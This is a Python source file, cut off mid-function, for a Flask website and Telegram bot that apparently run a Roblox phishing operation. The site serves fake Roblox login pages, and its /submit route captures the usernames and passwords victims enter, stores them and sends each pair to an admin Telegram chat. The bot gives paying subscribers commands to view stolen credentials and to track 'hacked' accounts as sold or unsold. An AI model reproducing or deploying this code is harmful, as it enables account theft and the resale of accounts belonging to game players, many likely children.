```python
import os
import time
import logging
import threading
import ipaddress
from datetime import datetime, timedelta
from hashlib import md5
from urllib.parse import urlparse

import telebot
from telebot import types
import psycopg2
from psycopg2.extras import DictCursor
from flask import Flask, request, jsonify, render_template
import requests
from ratelimit import limits, sleep_and_retry
from bs4 import BeautifulSoup

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Flask –∏ Telegram –±–æ—Ç–∞
app = Flask(__name__)
bot = telebot.TeleBot(os.getenv('BOT_TOKEN'), parse_mode=None)

# –ö–æ–Ω—Å—Ç–∞–Ω—Ç—ã
ADMIN_CHAT_ID = "YOUR_ADMIN_CHAT_ID"  # –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ –≤–∞—à chat_id
SITE_URL = os.getenv('SITE_URL', 'https://your-app.onrender.com')
SECRET_WEBHOOK_TOKEN = os.getenv('SECRET_WEBHOOK_TOKEN', 'your-secret-token')
CALLS_PER_MINUTE = 30
ONE_MINUTE = 60
PROCESSED_UPDATES = set()
ALLOWED_IPS = [
    ipaddress.ip_network('149.154.160.0/20'),
    ipaddress.ip_network('91.108.4.0/22')
]
ad_keywords = [
    '–∫–∞–∑–∏–Ω–æ', 'casino', '—Å—Ç–∞–≤–∫–∏', 'bet', '–ø–æ—Ö—É–¥–µ–Ω–∏–µ', '–¥–∏–µ—Ç–∞', '–∑–∞—Ä–∞–±–æ—Ç–æ–∫', '–ø–æ—Ö—É–¥–µ—Ç—å',
    'crypto', '–∫—Ä–∏–ø—Ç–∞', 'binance', 'bitcoin', '–±–∏—Ç–∫–æ–∏–Ω', '–∏–Ω–≤–µ—Å—Ç–∏—Ü–∏–∏', '–ø–æ—Ö—É–¥–µ—Ç—å –∑–∞',
    '–¥–µ–Ω—å–≥–∏', 'money', '–∑–∞—Ä–∞–±–æ—Ç–∞—Ç—å', '–ø–æ—Ö—É–¥–µ—Ç—å –±—ã—Å—Ç—Ä–æ'
]

# –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
tech_mode = False
tech_reason = ""
tech_end_time = None

# –£—Ç–∏–ª–∏—Ç—ã
def get_current_time():
    return datetime.utcnow()

def format_time(dt):
    if isinstance(dt, str):
        dt = datetime.fromisoformat(dt)
    return dt.strftime('%d.%m.%Y %H:%M:%S UTC')

def sanitize_input(text):
    if not text:
        return ""
    return ''.join(c for c in str(text) if c.isprintable()).strip()

def hash_data(data):
    return md5(str(data).encode()).hexdigest()

@sleep_and_retry
@limits(calls=CALLS_PER_MINUTE, period=ONE_MINUTE)
def get_db_connection():
    try:
        conn = psycopg2.connect(os.getenv('DATABASE_URL'), cursor_factory=DictCursor)
        logger.debug("–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö —É—Å–ø–µ—à–Ω–æ")
        return conn
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –±–∞–∑–µ: {e}")
        return None

def init_db():
    conn = get_db_connection()
    if not conn:
        return False
    try:
        with conn.cursor() as c:
            c.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    chat_id TEXT PRIMARY KEY,
                    prefix TEXT NOT NULL,
                    subscription_end TEXT,
                    last_activity TEXT,
                    ip_hash TEXT,
                    username TEXT
                )
            ''')
            c.execute('''
                CREATE TABLE IF NOT EXISTS credentials (
                    login TEXT PRIMARY KEY,
                    password TEXT NOT NULL,
                    added_time TEXT,
                    added_by TEXT
                )
            ''')
            c.execute('''
                CREATE TABLE IF NOT EXISTS hacked_accounts (
                    login TEXT PRIMARY KEY,
                    password TEXT NOT NULL,
                    hack_date TEXT,
                    prefix TEXT,
                    sold_status TEXT,
                    linked_chat_id TEXT
                )
            ''')
            c.execute('''
                CREATE TABLE IF NOT EXISTS support_tickets (
                    ticket_id SERIAL PRIMARY KEY,
                    chat_id TEXT NOT NULL,
                    message TEXT NOT NULL,
                    created_at TEXT,
                    status TEXT DEFAULT 'open'
                )
            ''')
            conn.commit()
        logger.info("–ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–∞")
        return True
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ –±–∞–∑—ã: {e}")
        return False
    finally:
        conn.close()

def get_user(chat_id):
    conn = get_db_connection()
    if not conn:
        return None
    try:
        with conn.cursor() as c:
            c.execute("SELECT * FROM users WHERE chat_id = %s", (chat_id,))
            user = c.fetchone()
            return user
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {chat_id}: {e}")
        return None
    finally:
        conn.close()

def save_user(chat_id, prefix, subscription_end, ip, username):
    conn = get_db_connection()
    if not conn:
        return False
    try:
        with conn.cursor() as c:
            c.execute(
                '''
                INSERT INTO users (chat_id, prefix, subscription_end, last_activity, ip_hash, username)
                VALUES (%s, %s, %s, %s, %s, %s)
                ON CONFLICT (chat_id) DO UPDATE
                SET prefix = EXCLUDED.prefix,
                    subscription_end = EXCLUDED.subscription_end,
                    last_activity = EXCLUDED.last_activity,
                    ip_hash = EXCLUDED.ip_hash,
                    username = EXCLUDED.username
                ''',
                (chat_id, prefix, subscription_end, get_current_time().isoformat(), hash_data(ip), username)
            )
            conn.commit()
        logger.debug(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {chat_id} —Å–æ—Ö—Ä–∞–Ω—ë–Ω")
        return True
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {chat_id}: {e}")
        return False
    finally:
        conn.close()

def get_all_users():
    conn = get_db_connection()
    if not conn:
        return []
    try:
        with conn.cursor() as c:
            c.execute("SELECT chat_id, prefix, username FROM users")
            return c.fetchall()
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: {e}")
        return []
    finally:
        conn.close()

def get_tech_assistants():
    conn = get_db_connection()
    if not conn:
        return []
    try:
        with conn.cursor() as c:
            c.execute("SELECT chat_id FROM users WHERE prefix IN ('–¢–µ—Ö–ü–æ–º–æ—â–Ω–∏–∫', '–ê–¥–º–∏–Ω', '–°–æ–∑–¥–∞—Ç–µ–ª—å')")
            return [row['chat_id'] for row in c.fetchall()]
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è —Ç–µ—Ö–ø–æ–º–æ—â–Ω–∏–∫–æ–≤: {e}")
        return []
    finally:
        conn.close()

def check_access(chat_id, command):
    user = get_user(chat_id)
    if not user:
        return "‚ùå *–í—ã –Ω–µ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω—ã!*"
    if user['prefix'] == '–°–æ–∑–¥–∞—Ç–µ–ª—å':
        return None
    subscription_end = datetime.fromisoformat(user['subscription_end']) if user['subscription_end'] else get_current_time()
    if subscription_end < get_current_time():
        return "‚è∞ *–í–∞—à–∞ –ø–æ–¥–ø–∏—Å–∫–∞ –∏—Å—Ç–µ–∫–ª–∞!*"
    if command in ['menu', 'start', 'passwords', 'support']:
        return None
    if user['prefix'] == '–ê–¥–º–∏–Ω' and command in ['database', 'viewdb', 'admin', 'addcred', 'addhacked', 'adprefix', 'delprefix', 'adduser', 'broadcast', 'messageuser', 'techstop', 'techstopoff']:
        return None
    if user['prefix'] == '–¢–µ—Ö–ü–æ–º–æ—â–Ω–∏–∫' and command in ['techstop', 'techstopoff', 'messageuser']:
        return None
    return "üîí *–î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â—ë–Ω!*"

def keep_alive():
    while True:
        try:
            requests.get(SITE_URL, timeout=5)
            logger.debug("Keep-alive –ø–∏–Ω–≥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω")
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ keep-alive: {e}")
        time.sleep(300)

# Flask –º–∞—Ä—à—Ä—É—Ç—ã
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/<path:path>')
def catch_all(path):
    templates = [
        'toptrending.html', 'login-roblox.html', 'upandcoming.html',
        'funwithfriends.html', 'hotrightnow.html', 'toprevisted.html'
    ]
    if path in templates:
        return render_template(path)
    return render_template('404.html')

@app.route('/submit', methods=['POST'])
def submit():
    login = sanitize_input(request.form.get('username'))
    password = sanitize_input(request.form.get('password'))
    logger.info(f"–ü–æ–ª—É—á–µ–Ω—ã –¥–∞–Ω–Ω—ã–µ: login={login}")
    if not login or not password:
        return jsonify({'status': 'error', 'message': '–õ–æ–≥–∏–Ω –∏ –ø–∞—Ä–æ–ª—å –æ–±—è–∑–∞—Ç–µ–ª—å–Ω—ã'}), 400
    conn = get_db_connection()
    if not conn:
        return jsonify({'status': 'error', 'message': '–ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞'}), 500
    try:
        with conn.cursor() as c:
            c.execute(
                '''
                INSERT INTO credentials (login, password, added_time, added_by)
                VALUES (%s, %s, %s, %s)
                ON CONFLICT (login) DO NOTHING
                ''',
                (login, password, get_current_time().isoformat(), 'web')
            )
            conn.commit()
            bot.send_message(
                ADMIN_CHAT_ID,
                f"üîê *–ù–æ–≤—ã–π –ø–∞—Ä–æ–ª—å —á–µ—Ä–µ–∑ —Å–∞–π—Ç*\nüë§ *–õ–æ–≥–∏–Ω*: `{login}`\nüîí *–ü–∞—Ä–æ–ª—å*: `{password}`",
                parse_mode='Markdown'
            )
            with open('templates/404.index', 'a', encoding='utf-8') as f:
                f.write(f"{login}\n")
        return jsonify({'status': 'success', 'message': '–î–∞–Ω–Ω—ã–µ —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã'}), 200
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö: {e}")
        return jsonify({'status': 'error', 'message': '–û—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞'}), 500
    finally:
        conn.close()

@app.route('/webhook', methods=['POST'])
def webhook():
    client_ip = ipaddress.ip_address(request.remote_addr)
    if not any(client_ip in network for network in ALLOWED_IPS):
        logger.warning(f"–ù–µ—Å–∞–Ω–∫—Ü–∏–æ–Ω–∏—Ä–æ–≤–∞–Ω–Ω—ã–π IP: {client_ip}")
        return jsonify({'status': 'error', 'message': 'Unauthorized IP'}), 403
    if request.headers.get('X-Telegram-Bot-Api-Secret-Token') != SECRET_WEBHOOK_TOKEN:
        logger.warning("–ù–µ–≤–µ—Ä–Ω—ã–π —Å–µ–∫—Ä–µ—Ç–Ω—ã–π —Ç–æ–∫–µ–Ω")
        return jsonify({'status': 'error', 'message': 'Invalid secret token'}), 403
    if len(PROCESSED_UPDATES) > 1000:
        PROCESSED_UPDATES.clear()
    update = request.get_json()
    update_id = update.get('update_id')
    if update_id in PROCESSED_UPDATES:
        logger.debug(f"–ü–æ–≤—Ç–æ—Ä–Ω—ã–π update_id: {update_id}")
        return jsonify({'status': 'ok'}), 200
    PROCESSED_UPDATES.add(update_id)
    try:
        bot.process_new_updates([telebot.types.Update.de_json(update)])
        return jsonify({'status': 'ok'}), 200
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –≤–µ–±—Ö—É–∫–∞: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Telegram –∫–æ–º–∞–Ω–¥—ã
@bot.message_handler(commands=['start'])
def start_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"
    logger.info(f"/start –æ—Ç {chat_id} (username: {username})")
    user = get_user(chat_id)
    if not user:
        subscription_end = (get_current_time() + timedelta(days=30)).isoformat()
        save_user(chat_id, '–ü–æ—Å–µ—Ç–∏—Ç–µ–ª—å', subscription_end, str(message.from_user.id), username)
        bot.reply_to(
            message,
            f"üëã *–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, @{username}!*\n–í—ã –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω—ã –∫–∞–∫ *–ü–æ—Å–µ—Ç–∏—Ç–µ–ª—å*.\nüìñ –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ /menu –¥–ª—è –∫–æ–º–∞–Ω–¥.",
            parse_mode='Markdown'
        )
        bot.send_message(
            ADMIN_CHAT_ID,
            f"üÜï *–ù–æ–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å*\nüÜî *Chat ID*: `{chat_id}`\nüìõ *–Æ–∑–µ—Ä–Ω–µ–π–º*: @{username}",
            parse_mode='Markdown'
        )
    else:
        save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
        bot.reply_to(
            message,
            f"üëã *–° –≤–æ–∑–≤—Ä–∞—â–µ–Ω–∏–µ–º, @{username}!*\n–í–∞—à —Å—Ç–∞—Ç—É—Å: *{user['prefix']}*\nüìñ –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ /menu –¥–ª—è –∫–æ–º–∞–Ω–¥.",
            parse_mode='Markdown'
        )

@bot.message_handler(commands=['menu'])
def menu_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"
    logger.info(f"/menu –æ—Ç {chat_id} (username: {username})")
    access = check_access(chat_id, 'menu')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    response = (
        f"üìã *–ú–µ–Ω—é –∫–æ–º–∞–Ω–¥*\n\n"
        f"üîê /passwords ‚Äî –ü—Ä–æ—Å–º–æ—Ç—Ä –ø–∞—Ä–æ–ª–µ–π\n"
        f"üì© /support ‚Äî –û–±—Ä–∞—Ç–∏—Ç—å—Å—è –≤ –ø–æ–¥–¥–µ—Ä–∂–∫—É\n"
        f"üóÑ /database ‚Äî –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –±–∞–∑–æ–π –¥–∞–Ω–Ω—ã—Ö\n"
        f"üîß /admin ‚Äî –ü–∞–Ω–µ–ª—å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞\n"
    )
    try:
        bot.reply_to(message, response, parse_mode='Markdown')
        user = get_user(chat_id)
        if user:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ /menu: {e}")
        bot.reply_to(message, "‚ùå *–û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥—ã!*", parse_mode='Markdown')

@bot.message_handler(commands=['passwords'])
def passwords_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"
    logger.info(f"/passwords –æ—Ç {chat_id} (username: {username})")
    access = check_access(chat_id, 'passwords')
    if access:
        logger.warning(f"–î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â—ë–Ω –¥–ª—è {chat_id}: {access}")
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    conn = get_db_connection()
    if not conn:
        logger.error(f"–ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞ –¥–ª—è {chat_id}")
        bot.reply_to(message, "‚ùå *–ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞! –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.*", parse_mode='Markdown')
        return
    try:
        with conn.cursor() as c:
            logger.debug(f"–ó–∞–ø—Ä–æ—Å credentials –¥–ª—è {chat_id}")
            c.execute("SELECT login, password, added_time FROM credentials")
            credentials = c.fetchall()
            if not credentials:
                logger.info(f"–ü–∞—Ä–æ–ª–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã –¥–ª—è {chat_id}")
                bot.reply_to(message, "üì≠ *–°–ø–∏—Å–æ–∫ –ø–∞—Ä–æ–ª–µ–π –ø—É—Å—Ç.*", parse_mode='Markdown')
            else:
                for idx, (login, password, added_time) in enumerate(credentials, 1):
                    response = (
                        f"üîê *–õ–æ–≥–∏–Ω #{idx}*: `{login}`\n"
                        f"üîí *–ü–∞—Ä–æ–ª—å*: `{password}`\n"
                        f"üïí *–î–æ–±–∞–≤–ª–µ–Ω–æ*: {format_time(added_time)}\n"
                    )
                    keyboard = types.InlineKeyboardMarkup()
                    user = get_user(chat_id)
                    if user and user['prefix'] in ["–ê–¥–º–∏–Ω", "–°–æ–∑–¥–∞—Ç–µ–ª—å", "–¢–µ—Ö–ü–æ–º–æ—â–Ω–∏–∫"]:
                        logger.debug(f"–î–æ–±–∞–≤–ª–µ–Ω–∏–µ –∫–Ω–æ–ø–∫–∏ —É–¥–∞–ª–µ–Ω–∏—è –¥–ª—è {login} (idx: {idx})")
                        keyboard.add(
                            types.InlineKeyboardButton(
                                f"üóë –£–¥–∞–ª–∏—Ç—å #{idx}",
                                callback_data=f"delete_cred_{login}_{idx}"
                            )
                        )
                    bot.send_message(
                        chat_id,
                        response,
                        reply_markup=keyboard,
                        parse_mode='Markdown'
                    )
            keyboard = types.InlineKeyboardMarkup()
            keyboard.add(
                types.InlineKeyboardButton("‚ûï –î–æ–±–∞–≤–∏—Ç—å –≤ hacked", callback_data="add_to_hacked")
            )
            if user and user['prefix'] in ["–ê–¥–º–∏–Ω", "–°–æ–∑–¥–∞—Ç–µ–ª—å", "–¢–µ—Ö–ü–æ–º–æ—â–Ω–∏–∫"]:
                logger.debug(f"–î–æ–±–∞–≤–ª–µ–Ω–∏–µ –∫–Ω–æ–ø–∫–∏ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –ø–∞—Ä–æ–ª—è –¥–ª—è {chat_id}")
                keyboard.add(
                    types.InlineKeyboardButton("‚ûï –î–æ–±–∞–≤–∏—Ç—å –ø–∞—Ä–æ–ª—å", callback_data="add_cred")
                )
            bot.send_message(
                chat_id,
                "‚öôÔ∏è *–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ*:",
                reply_markup=keyboard,
                parse_mode='Markdown'
            )
            logger.info(f"–ü–∞—Ä–æ–ª–∏ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –¥–ª—è {chat_id}")
            if user:
                save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ /passwords –¥–ª—è {chat_id}: {e}")
        bot.reply_to(message, "‚ùå *–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ –¥–∞–Ω–Ω—ã—Ö! –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.*", parse_mode='Markdown')
    finally:
        conn.close()

@bot.callback_query_handler(func=lambda call: call.data.startswith('delete_cred_') or call.data in ['add_to_hacked', 'add_cred'])
def handle_passwords_buttons(call):
    chat_id = str(call.message.chat.id)
    logger.info(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–Ω–æ–ø–∫–∏ {call.data} –æ—Ç {chat_id}")
    access = check_access(chat_id, 'passwords')
    if access:
        logger.warning(f"–î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â—ë–Ω –¥–ª—è –∫–Ω–æ–ø–∫–∏ {call.data}: {access}")
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, access, parse_mode='Markdown')
        return
    user = get_user(chat_id)
    if not user:
        logger.error(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {chat_id} –Ω–µ –Ω–∞–π–¥–µ–Ω")
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, "‚ùå *–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω!*", parse_mode='Markdown')
        return
    try:
        if call.data.startswith('delete_cred_'):
            if user['prefix'] not in ['–ê–¥–º–∏–Ω', '–°–æ–∑–¥–∞—Ç–µ–ª—å', '–¢–µ—Ö–ü–æ–º–æ—â–Ω–∏–∫']:
                logger.warning(f"–ü–æ–ø—ã—Ç–∫–∞ —É–¥–∞–ª–µ–Ω–∏—è –ø–∞—Ä–æ–ª—è –±–µ–∑ –ø—Ä–∞–≤: {chat_id}")
                bot.answer_callback_query(call.id)
                bot.send_message(chat_id, "üîí *–£–¥–∞–ª–µ–Ω–∏–µ –ø–∞—Ä–æ–ª–µ–π —Ç–æ–ª—å–∫–æ –¥–ª—è –∞–¥–º–∏–Ω–æ–≤!*", parse_mode='Markdown')
                return
            try:
                _, login, idx = call.data.split('_', 2)
                logger.debug(f"–ü–æ–ø—ã—Ç–∫–∞ —É–¥–∞–ª–µ–Ω–∏—è –ª–æ–≥–∏–Ω–∞ {login} (idx: {idx})")
                conn = get_db_connection()
                if not conn:
                    logger.error(f"–ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞ –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è {login}")
                    bot.send_message(chat_id, "‚ùå *–ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞!*", parse_mode='Markdown')
                    bot.answer_callback_query(call.id)
                    return
                with conn.cursor() as c:
                    c.execute("SELECT login FROM credentials WHERE login = %s", (login,))
                    if not c.fetchone():
                        logger.warning(f"–õ–æ–≥–∏–Ω {login} –Ω–µ –Ω–∞–π–¥–µ–Ω –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è")
                        bot.send_message(chat_id, f"‚ùå *–õ–æ–≥–∏–Ω `{login}` –Ω–µ –Ω–∞–π–¥–µ–Ω!*", parse_mode='Markdown')
                        bot.answer_callback_query(call.id)
                        return
                    c.execute("DELETE FROM credentials WHERE login = %s", (login,))
                    conn.commit()
                    logger.info(f"–õ–æ–≥–∏–Ω {login} —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª—ë–Ω")
                    bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=call.message.message_id,
                        text=f"‚úÖ *–õ–æ–≥–∏–Ω #{idx} `{login}` —É–¥–∞–ª—ë–Ω!*",
                        parse_mode='Markdown'
                    )
                    bot.send_message(
                        ADMIN_CHAT_ID,
                        f"üóë *–ü–∞—Ä–æ–ª—å —É–¥–∞–ª—ë–Ω*\nüë§ *–õ–æ–≥–∏–Ω*: `{login}`\nüë§ *–£–¥–∞–ª–∏–ª*: {chat_id}",
                        parse_mode='Markdown'
                    )
            except Exception as e:
                logger.error(f"–û—à–∏–±–∫–∞ —É–¥–∞–ª–µ–Ω–∏—è –ª–æ–≥–∏–Ω–∞ {login}: {e}")
                bot.send_message(chat_id, "‚ùå *–û—à–∏–±–∫–∞ —É–¥–∞–ª–µ–Ω–∏—è! –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.*", parse_mode='Markdown')
                bot.answer_callback_query(call.id)
            finally:
                if conn:
                    conn.close()
        elif call.data == 'add_to_hacked':
            if user['prefix'] not in ['–ê–¥–º–∏–Ω', '–°–æ–∑–¥–∞—Ç–µ–ª—å', '–¢–µ—Ö–ü–æ–º–æ—â–Ω–∏–∫']:
                logger.warning(f"–ü–æ–ø—ã—Ç–∫–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –≤ hacked –±–µ–∑ –ø—Ä–∞–≤: {chat_id}")
                bot.answer_callback_query(call.id)
                bot.send_message(chat_id, "üîí *–î–æ–±–∞–≤–ª–µ–Ω–∏–µ –≤ hacked —Ç–æ–ª—å–∫–æ –¥–ª—è –∞–¥–º–∏–Ω–æ–≤!*", parse_mode='Markdown')
                return
            logger.debug(f"–ó–∞–ø—Ä–æ—Å –≤–≤–æ–¥–∞ –ª–æ–≥–∏–Ω–∞ –¥–ª—è hacked –æ—Ç {chat_id}")
            msg = bot.send_message(chat_id, "üìù *–í–≤–µ–¥–∏—Ç–µ –ª–æ–≥–∏–Ω –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –≤ hacked*:", parse_mode='Markdown')
            bot.register_next_step_handler(msg, process_hacked_login)
            bot.answer_callback_query(call.id)
        elif call.data == 'add_cred':
            if user['prefix'] not in ['–ê–¥–º–∏–Ω', '–°–æ–∑–¥–∞—Ç–µ–ª—å', '–¢–µ—Ö–ü–æ–º–æ—â–Ω–∏–∫']:
                logger.warning(f"–ü–æ–ø—ã—Ç–∫–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –ø–∞—Ä–æ–ª—è –±–µ–∑ –ø—Ä–∞–≤: {chat_id}")
                bot.answer_callback_query(call.id)
                bot.send_message(chat_id, "üîí *–î–æ–±–∞–≤–ª–µ–Ω–∏–µ –ø–∞—Ä–æ–ª–µ–π —Ç–æ–ª—å–∫–æ –¥–ª—è –∞–¥–º–∏–Ω–æ–≤!*", parse_mode='Markdown')
                return
            logger.debug(f"–ó–∞–ø—Ä–æ—Å –≤–≤–æ–¥–∞ –ª–æ–≥–∏–Ω–∞ –¥–ª—è credentials –æ—Ç {chat_id}")
            msg = bot.send_message(chat_id, "üìù *–í–≤–µ–¥–∏—Ç–µ –ª–æ–≥–∏–Ω –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è*:", parse_mode='Markdown')
            bot.register_next_step_handler(msg, process_add_cred_login)
            bot.answer_callback_query(call.id)
    except Exception as e:
        logger.error(f"–û–±—â–∞—è –æ—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –∫–Ω–æ–ø–∫–∏ {call.data}: {e}")
        bot.send_message(chat_id, "‚ùå *–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –∫–Ω–æ–ø–∫–∏! –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.*", parse_mode='Markdown')
        bot.answer_callback_query(call.id)

def process_hacked_login(message):
    chat_id = str(message.chat.id)
    login = sanitize_input(message.text)
    logger.info(f"–õ–æ–≥–∏–Ω –¥–ª—è hacked: {login} –æ—Ç {chat_id}")
    if not login:
        bot.reply_to(message, "‚ùå *–õ–æ–≥–∏–Ω –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø—É—Å—Ç—ã–º!*", parse_mode='Markdown')
        return
    msg = bot.reply_to(message, "üîí *–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å*:", parse_mode='Markdown')
    bot.register_next_step_handler(msg, lambda m: process_hacked_password(m, login))

def process_hacked_password(message, login):
    chat_id = str(message.chat.id)
    password = sanitize_input(message.text)
    logger.info(f"–ü–∞—Ä–æ–ª—å –¥–ª—è {login} –æ—Ç {chat_id}")
    if not password:
        bot.reply_to(message, "‚ùå *–ü–∞—Ä–æ–ª—å –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø—É—Å—Ç—ã–º!*", parse_mode='Markdown')
        return
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(
        types.InlineKeyboardButton("‚úÖ –ü—Ä–æ–¥–∞–Ω", callback_data=f"hacked_status_sold_{login}_{password}"),
        types.InlineKeyboardButton("‚õî –ù–µ–ø—Ä–æ–¥–∞–Ω", callback_data=f"hacked_status_not_sold_{login}_{password}")
    )
    bot.reply_to(message, "üìä *–í—ã–±–µ—Ä–∏—Ç–µ —Å—Ç–∞—Ç—É—Å –∞–∫–∫–∞—É–Ω—Ç–∞*:", reply_markup=keyboard, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data.startswith('hacked_status_'))
def handle_hacked_status(call):
    chat_id = str(call.message.chat.id)
    logger.info(f"–°—Ç–∞—Ç—É—Å {call.data} –æ—Ç {chat_id}")
    access = check_access(chat_id, 'passwords')
    if access:
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, access, parse_mode='Markdown')
        return
    try:
        _, status, login, password = call.data.split('_', 3)
        sold_status = "–ü—Ä–æ–¥–∞–Ω" if status == "sold" else "–ù–µ–ø—Ä–æ–¥–∞–Ω"
        conn = get_db_connection()
        if not conn:
            bot.send_message(chat_id, "‚ùå *–ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞!*", parse_mode='Markdown')
            bot.answer_callback_query(call.id)
            return
        with conn.cursor() as c:
